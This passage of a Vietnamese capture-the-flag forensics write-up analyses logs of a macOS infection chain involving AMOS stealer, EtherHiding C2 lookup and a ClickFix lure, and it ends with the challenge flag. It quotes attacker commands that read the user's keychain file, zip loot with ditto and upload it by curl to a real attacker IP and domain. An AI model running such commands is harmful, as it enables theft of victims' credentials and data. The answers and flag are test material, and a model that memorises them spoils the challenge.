Bước tiếp theo là agent (bmodule) thực hiện gửi `&connect` đến cho server C2 và khi server đã trả về `newconnect` thực hiện biến máy compromised này thành 1 trong các botnet, sau đó xóa toàn bộ các permission hiện có trên máy bằng lệnh `tccutil reset All` -> Đây là bước dùng để các payload ở stage sau như `AMOS stealer` có thể abuse user nhấn allow để có thể truy cập vào các thư mục của người dùng. Và cứ 60s thì nó sẽ thực hiện gửi 1 lệnh `&task` lên cho server để yêu cầu command cho 1 trong các stage tiếp theo:

<img width="1572" height="1446" alt="image" src="https://github.com/user-attachments/assets/82084042-24af-42ba-a927-2375a554f244" />

| C2 Response | Request | Payload stage4 |
| --- | --- | --- |
| notasks | idle | Không làm gì cả |
| runloader | POST ..&module \ oascript | AMOS Stealer |
| runlight | POST ...&lmodule \ oascript| light stealer |
| replacer | POST ...&ledger  \ sh | XMRIG miner |
| openshell | POST ..&shell \ sh | RCE |


**6. Trong các Process Creation có target command line trực tiếp chứa . authonly (không có prefix sh -c), giá trị duy nhất của tgt.process.name là gì? — Format: utility_name**

-> dscl (command dscl .authonly <usern> <passwrd>) 

**7. Trong command của target process cat đọc từ thư mục Library/Keychains của user đã xác định ở câu 1, tên file nguồn là gì? — Format: filename**

Mình thực hiện filter theo `Library/Keychains`:

<img width="1760" height="696" alt="image" src="https://github.com/user-attachments/assets/fdae5015-6382-48f0-8cb0-1a47b07c1185" />

-> `sh -c cat '/Users/jsmith/Library/Keychains/login.keychain-db' > '/tmp/243ecac440957eac5ef42ac43fe850961785323732/login.keychain-db'` -> full command mà attacker đã thực thi, command này đọc toàn bộ file `login.keychain-db` - file này là file chứa toàn bộ password lưu trên 1 máy macOS, và được encrypt bằng password của user, bởi vì attacker đã có password từ lệnh kiểm tra `dscl .authonly` nên bây giờ attacker đọc toàn bộ file này để lấy full password được lưu trên máy macOS của victim

**8. Giá trị duy nhất của trường JSON params[0].to trong các target curl command thực hiện eth_call là gì? — Format: 0x0123456789abcdef...**

-> 0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0 - nằm trong json request POST lên server c2 của agent, contract đã được sử dụng kỹ thuật `EtherHidding` để giấu server C2 host bên trong

**9. Có bao nhiêu unique tgt.process.uid trong các Process Creation có tgt.process.name=curl và command chứa &task? — Format: 123**

Mình thực hiện multi filter như sau trên **datablist**:

<img width="894" height="579" alt="image" src="https://github.com/user-attachments/assets/48204a37-1c80-4d35-81f6-77810c6b28f5" />

<img width="626" height="84" alt="image" src="https://github.com/user-attachments/assets/21b77b1f-f4af-4844-af78-6d1a178581ba" />

-> 642 `&task` được send

**10. Sau khi dùng đúng bộ lọc của câu 9, giá trị src.process.pid nào có số record lớn nhất? — Format: 12345**

<img width="137" height="676" alt="image" src="https://github.com/user-attachments/assets/792da92f-4d25-44f6-80e6-6596e72cb5a6" />

Ở đây mình filter thấy `src.process.pid` khá lớn ở đây là 87990, nên mình thực hiện filter xem có số nào lớn hơn nửa không:

<img width="910" height="628" alt="image" src="https://github.com/user-attachments/assets/b765f087-91d4-4fae-bc4e-956da13000ae" />

<img width="1653" height="920" alt="image" src="https://github.com/user-attachments/assets/97610a66-e32d-4437-8fac-ee08914d4e80" />

Không trả về gì cả nên source process pid lớn nhất là: **87990**

**11. Trong bài phân tích của NetbyteSEC chứa smart contract tìm được ở câu 8, kỹ thuật lưu và truy xuất C2 từ blockchain được gọi là gì**

-> Là kỹ thuật **EtherHding**

**12. Trong chính bài phân tích của NetbyteSEC đó, tên viết tắt của malware family được tác giả xác định cho smodule là gì? — Format: FAMILY**

Tới đây attacker bắt đầu thực hiện dropper malware xuống hệ thống của máy victim, 

**AMOS Stealer**: là dropper malware InfoStealer dùng để thu thập toàn bộ các data về web browsing, keychain password, folder và file trong desktop, documents, download, hơn nữa nó còn target vào credentials browser data, và cả cryptography currencies wallet. Bên trong chain attack này nó thực hiện thu thập Desktop Wallet, Browser Data bao gồm firefox và Chrome, MacOS keychain, browser Safe Storage key, các file trong `~/Desktop, Documents`. Đồng thời nó cũng được sử dụng làm 1 method exfiltration data:

<img width="1040" height="242" alt="image" src="https://github.com/user-attachments/assets/154849a5-4f97-4433-b148-08cc78c8c81b" />

> Command `ditto` trong macOS là 1 lệnh legitmate có thể được lợi dụng để nén các file và folder thành file zip để dùng trong quá trình exfiltration data. 

**Light Stealer:** là version nhẹ hơn và ít tính năng hơn AMOS Stealer, được sử dụng khi người vận hành ưu tiên tốc độ và khả năng tàng hình hơn là thu thập dữ liệu toàn diện.

**ledger + xmr - the XMRig cryptominer:** là một phần mềm mã nguồn mở dùng để khai thác các tiền điện thử như Monero.

Stage cuối cùng là thực hiện exfiltration data, đầu tiên là các file credentials đã được nén lại trong stage4 ở con infostealer AMOS bằng lệnh `ditto`, sau đó sử dụng command curl để đẩy toàn bộ các file zip lên server C2 của attacker:

```
ditto -c -k --sequesterRsrc <lootdir> /tmp/<hash>.zip
# if the zip is > 90 MB:
curl -F 'txid=427e8b573407f6029923cdb4686b5f77' -F 'file=@/tmp/<hash>.zip' <http://62.60.226.0/upload.php>
# else:
curl -F 'txid=427e8b573407f6029923cdb4686b5f77' -F 'file=@/tmp/<hash>.zip' <https://hf98x4d.site/upload.php> # fallback → bare IP
```

**13. Địa chỉ Polygon operator wallet được bài phân tích của NetbyteSEC liệt kê là gì? — Format: 0x0123456789abcdef0123456789abcdef01234567**

-> Đây là Polygon operator wallet dùng để trace ra các C2 server được giấu bằng kỹ thuật **EtherHiding**, bên trên đầu của bài blog này đã nhắc đến: 

<img width="1066" height="753" alt="image" src="https://github.com/user-attachments/assets/329b9400-558c-4f68-84aa-b32d3c3adb7a" />

Bằng cách trace theo lịch sử giao dịch của attacker thì chúng ta có thể rotation lần lượt ra các server C2 được giấu: **0x363aeaf1f67f1fb7abddc3f9806a301f1c64abe3**

**14. Theo bảng lịch sử C2 trong bài phân tích của NetbyteSEC, domain tìm được ở câu 5 được ghi nhận với vai trò current / live vào ngày UTC nào? — Format: YYYY-MM-DD**

<img width="1024" height="59" alt="image" src="https://github.com/user-attachments/assets/201836cf-bdb0-46fe-b8b9-4bd86036f688" />

Đây là domain tìm được ở câu 5: 67sixcebeh.surf - date: **2026-07-21**

**15. Domain Cloudflare Pages nào được NetbyteSEC nêu là nơi phục vụ lure macOS mà họ điều tra trong tháng 7/2026? — Format: subdomain.example**

<img width="1061" height="285" alt="image" src="https://github.com/user-attachments/assets/16a258ca-dd3d-432d-956e-6c8eb52e420d" />

Đây là domain mà attacker đã sử dụng để tạo một capcha verify giả sử dụng kĩ thuật **ClickFix** để lừa victim:

**25382ea9.trustkey-otcheckv1.pages.dev**

Sau khi hoàn thành toàn bộ thì mình sẽ có được **Flag: KMACTF{co_gai_nam_ay_anh_tung_thuong}**
